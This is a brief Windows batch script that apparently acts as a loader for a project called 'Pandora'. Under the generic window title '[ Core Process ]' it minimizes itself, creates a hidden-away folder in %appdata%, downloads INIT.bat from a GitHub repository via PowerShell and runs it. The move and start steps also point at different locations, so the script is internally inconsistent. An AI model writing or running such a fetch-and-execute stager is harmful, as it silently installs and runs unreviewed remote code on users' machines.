@echo OFF
title [ Core Process ]

powershell -window minimized -command ""

if not exist %appdata%\Pandora\ md %appdata%\Pandora\ > NUL

timeout 1 > NUL

cd %appdata%\Pandora\ > NUL

timeout 1 > NUL

if not exist %cd%\INIT.bat powershell -command "Invoke-WebRequest https://github.com/Vanthanyx/Pandora/raw/main/INIT.bat -Outfile INIT.bat" && timeout 1  && move /Y %cd%\INIT.bat %cd%\SRC\Batch\Admin\ > NUL

timeout 1 > NUL

start INIT.bat > NUL

exit
